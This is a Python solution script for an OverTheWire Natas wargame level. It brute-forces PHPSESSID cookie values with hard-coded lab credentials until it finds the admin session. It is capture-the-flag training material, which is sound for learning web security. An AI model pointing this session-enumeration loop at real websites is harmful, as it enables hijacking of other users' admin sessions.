#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
from requests.auth import HTTPBasicAuth

username = "natas18"
password = "6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ"
url = f"http://{username}.natas.labs.overthewire.org/"

session = requests.Session()
auth = HTTPBasicAuth(username, password)

for session_id in range(1, 641):
    try:
        resp = session.get(url, cookies={"PHPSESSID": str(session_id)}, auth=auth, timeout=8)
    except requests.RequestException as e:
        print(f"[!] Request error for PHPSESSID={session_id}: {e}")
        continue

    content = resp.text
    if "You are an admin" in content:
        print("Got it! PHPSESSID =", session_id)
        print(content)
        break
    else:
        print("trying", session_id)
